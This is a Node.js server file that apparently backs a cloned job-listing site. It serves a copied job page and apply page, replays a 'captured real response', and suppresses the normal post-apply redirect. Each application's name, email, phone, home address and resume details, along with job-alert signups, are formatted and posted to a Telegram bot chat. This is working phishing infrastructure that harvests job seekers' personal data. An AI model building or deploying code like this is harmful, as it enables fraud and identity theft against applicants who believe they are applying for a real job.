// Static server: serves the Customer Service Representative job page + apply page,
// the Telegram notify + health endpoints, and static assets.
// Root "/" redirects to the job page. Everything else returns 404.
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;

// ---- minimal .env loader (no dependencies) ----
(function loadEnv() {
  try {
    const envPath = path.join(__dirname, '.env');
    if (!fs.existsSync(envPath)) return;
    const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
    for (const line of lines) {
      const m = line.match(/^\s*([\w.-]+)\s*=\s*(.*)\s*$/);
      if (m && process.env[m[1]] === undefined) process.env[m[1]] = m[2];
    }
  } catch (e) { /* ignore */ }
})();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// ---- Telegram notify: single source of truth for message formatting + send ----
function formatBytes(bytes) {
  const n = Number(bytes);
  if (!bytes || !isFinite(n) || n <= 0) return '';
  if (n < 1024) return n + ' B';
  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
  return (n / (1024 * 1024)).toFixed(1) + ' MB';
}

function fmtApplication(d) {
  return [
    '📄 NEW JOB APPLICATION',
    '━━━━━━━━━━━━━━━━━━',
    '👤 Name: ' + ((d.first_name || '') + ' ' + (d.last_name || '')).trim(),
    '📧 Email: ' + (d.email || ''),
    '📞 Phone: ' + (d.phone || ''),
    '🏠 Address: ' + [d.address1, d.address2, d.city, d.state].filter(Boolean).join(', '),
    '📎 Resume: ' + (d.resume_name || '-') + (d.resume_size ? ' (' + formatBytes(d.resume_size) + ')' : ''),
    '📢 Text alerts: ' + (d.textAlerts ? 'yes' : 'no'),
    '💼 Job: ' + (d.job_title || ''),
    '🔖 Ref: ' + (d.job_ref || ''),
    '📍 Location: ' + (d.job_location || ''),
  ].join('\n');
}

function fmtJobAlert(d) {
  return [
    '🔔 NEW JOB ALERT SIGNUP',
    '━━━━━━━━━━━━━━━━━━',
    '📧 Email: ' + (d.email || ''),
    '🔎 Query: ' + (d.query || ''),
    '📍 Location: ' + (d.location || ''),
    '⏰ Frequency: ' + (d.frequency || ''),
    '✅ Consent: ' + (d.consent ? 'yes' : 'no'),
  ].join('\n');
}

function fmtResumeUpload(d) {
  return [
    '📎 RESUME UPLOAD',
    '━━━━━━━━━━━━━━━━━━',
    '📄 File: ' + (d.file_name || ''),
    '📦 Size: ' + (d.file_size ? formatBytes(d.file_size) : ''),
    '💼 Job: ' + (d.job_title || ''),
    '🔖 Ref: ' + (d.job_ref || ''),
    '📍 Location: ' + (d.job_location || ''),
  ].join('\n');
}

const TELEGRAM_FORMATTERS = {
  application: fmtApplication,
  jobAlert: fmtJobAlert,
  resumeUpload: fmtResumeUpload,
};

function sendTelegram(text) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

const JOB_PATH = '/jobs/308/AB_4976816/administrative-assistant_fort-lauderdale/';
const APPLY_PATH = '/jobs/apply/308/AB_4976816/';

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.mjs': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject',
  '.map': 'application/json',
  '.txt': 'text/plain; charset=utf-8',
};

function send(res, code, body, type) {
  res.writeHead(code, {
    'Content-Type': type || 'text/plain; charset=utf-8',
    'Cache-Control': 'no-cache',
  });
  res.end(body);
}

function serveStatic(res, urlPath) {
  // Strip query string
  const clean = urlPath.split('?')[0];
  if (clean.includes('\0')) return send(res, 400, 'Bad Request');
  // Resolve inside ROOT, prevent traversal
  const file = path.normalize(path.join(ROOT, clean));
  if (!file.startsWith(ROOT)) return send(res, 403, 'Forbidden');
  fs.stat(file, (err, st) => {
    if (err || !st.isFile()) return send(res, 404, 'Not Found');
    fs.readFile(file, (err2, data) => {
      if (err2) return send(res, 404, 'Not Found');
      send(res, 200, data, MIME[path.extname(file).toLowerCase()] || 'application/octet-stream');
    });
  });
}

const server = http.createServer((req, res) => {
  const u = req.url.split('?')[0];
  // Request log: every hit is traced here so submit events can be observed
  // from the server terminal while testing from the UI.
  console.log('[http] ' + req.method + ' ' + req.url + (req.headers.origin ? ' (origin=' + req.headers.origin + ')' : ''));
  // Telegram notification endpoint (POST): pages fire-and-forget their events here.
  if (u === '/api/telegram/notify' && req.method === 'POST') {
    // CSRF guard: reject cross-origin browser requests unless they come from this server.
    const origin = req.headers.origin;
    if (origin) {
      try {
        const o = new URL(origin);
        if (o.host !== req.headers.host) { console.log('[notify] 403 forbidden origin: ' + origin); return send(res, 403, JSON.stringify({ ok: false, error: 'forbidden origin' }), 'application/json'); }
      } catch (e) {
        console.log('[notify] 403 bad origin: ' + origin);
        return send(res, 403, JSON.stringify({ ok: false, error: 'forbidden origin' }), 'application/json');
      }
    }
    let raw = '';
    let tooBig = false;
    req.on('data', (c) => {
      raw += c;
      if (raw.length > 1000000) tooBig = true;
    });
    req.on('end', async () => {
      if (tooBig) return send(res, 413, JSON.stringify({ ok: false, error: 'payload too large' }), 'application/json');
      try {
        const payload = JSON.parse(raw || '{}');
        const fmt = TELEGRAM_FORMATTERS[payload.type];
        if (!fmt) { console.log('[notify] unknown type: ' + payload.type); return send(res, 400, JSON.stringify({ ok: false, error: 'unknown type' }), 'application/json'); }
        const text = fmt(payload.data || {});
        console.log('[notify] type=' + payload.type + ' job=' + (payload.data && payload.data.job_title) + ' ref=' + (payload.data && payload.data.job_ref) + ' → sending to Telegram');
        const r = await sendTelegram(text);
        const ok = r.status === 200 && r.body.indexOf('"ok":true') !== -1;
        console.log('[notify] type=' + payload.type + ' result=' + (ok ? 'OK' : 'FAIL') + ' telegramStatus=' + r.status);
        send(res, ok ? 200 : 502, JSON.stringify({ ok: ok, telegramStatus: r.status }), 'application/json');
      } catch (e) {
        console.error('[notify] error: ' + String((e && e.message) || e));
        send(res, 400, JSON.stringify({ ok: false, error: String((e && e.message) || e) }), 'application/json');
      }
    });
    return;
  }
  if (u === '/health') {
    return send(res, 200, 'ok', 'text/plain; charset=utf-8');
  }
  if (u === '/') {
    res.writeHead(302, { Location: JOB_PATH });
    return res.end();
  }
  if (u === JOB_PATH || u === JOB_PATH.slice(0, -1)) {
    return serveStatic(res, path.join(JOB_PATH, 'index.html'));
  }
  if (u === APPLY_PATH || u === APPLY_PATH.slice(0, -1)) {
    return serveStatic(res, path.join(APPLY_PATH, 'index.html'));
  }
  // The app's data fallback endpoint (POST /api/search/get-callback) - serve
  // the captured real response so the page gets its expected data.
  if (u === '/api/search/get-callback') {
    return serveStatic(res, '/api/search/get-callback.json');
  }
  // static assets for the two pages
  if (u.startsWith('/search-app/') || u.startsWith('/themes/') ||
      u.startsWith('/scripts/') || u.startsWith('/s3fs-media/')) {
    return serveStatic(res, req.url);
  }
  // Post-apply confirmation redirect removed: the React flow that navigates
  // here is suppressed client-side (see telegram-notify.js capture hook), so
  // this URL is intentionally dead — no fallback, one source of truth.
  send(res, 404, 'Not Found');
});

// Bind all interfaces so Render (and other hosts) can reach the service.
server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
  console.log(`Serving on http://${process.env.HOST || '0.0.0.0'}:${PORT}${JOB_PATH}`);
});
